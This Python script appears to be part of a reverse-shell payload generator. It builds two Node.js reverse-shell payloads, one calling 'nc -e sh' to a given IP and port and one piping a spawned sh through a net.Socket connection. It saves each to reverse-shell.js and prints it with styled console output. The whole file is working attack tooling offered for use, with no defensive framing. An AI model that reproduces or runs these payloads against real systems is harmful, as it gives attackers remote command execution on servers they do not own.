from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def NodeJSShell1(ip, port):
	payload = f"require('child_process').exec('nc -e sh {ip} {port}')"
	with open("reverse-shell.js", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="material"):
		time.sleep(3)
		f.write(payload)
	myStyle = Style(color="#7780ff", bold=True)
	console.print("The payload is: \n", style=myStyle)
	synt = Syntax(payload,"javascript",theme='dracula', line_numbers=True)
	console.print(synt)
	console.print("\n[#aed06d]Saved as reverse-shell.js\n[/#aed06d]", style=myStyle)

def NodeJSShell2(ip, port):
	payload = """(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(%d, "%s", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();""" % (port, ip)

	with open("reverse-shell.js", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="material"):
		time.sleep(3)
		f.write(payload)
	myStyle = Style(color="#7780ff", bold=True)
	console.print("The payload is: \n", style=myStyle)
	synt = Syntax(payload,"javascript",theme='dracula', line_numbers=True)
	console.print(synt)
	console.print("\n[#aed06d]Saved as reverse-shell.js\n[/#aed06d]", style=myStyle)